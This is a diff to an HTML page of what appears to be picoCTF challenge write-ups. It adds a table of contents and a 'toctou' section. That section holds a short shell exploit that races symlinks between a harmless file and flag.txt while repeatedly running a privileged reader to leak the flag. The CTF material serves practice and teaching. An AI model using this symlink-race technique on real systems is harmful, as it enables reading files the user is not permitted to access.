@@ -163,7 +163,11 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="hijacking"><a class="header" href="#hijacking">hijacking</a></h1>
+                        <ul>
+<li><a href="#hijacking">hijacking</a></li>
+<li><a href="#toctou">toctou</a></li>
+</ul>
+<h2 id="hijacking"><a class="header" href="#hijacking">hijacking</a></h2>
 <p>ssh <strong>username</strong>@<strong>hostname</strong> -p <strong>port</strong></p>
 <pre><code class="language-shell">picoctf@challenge:~$ sudo -l
 Matching Defaults entries for picoctf on challenge:
@@ -316,6 +320,11 @@ Traceback (most recent call last):
     host_info = socket.gethostbyaddr(ip)
 socket.gaierror: [Errno -5] No address associated with hostname
 
+</code></pre>
+<h2 id="toctou"><a class="header" href="#toctou">toctou</a></h2>
+<p><a href="https://brandon-t-elliott.github.io/tic-tac">More detail</a></p>
+<pre><code class="language-python">timeout 30s bash -c 'while true; do ln -sf src.cpp flag; ln -sf flag.txt flag; done' &amp;
+while ! ./txtreader flag 2&gt; /dev/null | grep &quot;picoCTF&quot;; do :; done
 </code></pre>
 
                     </main>
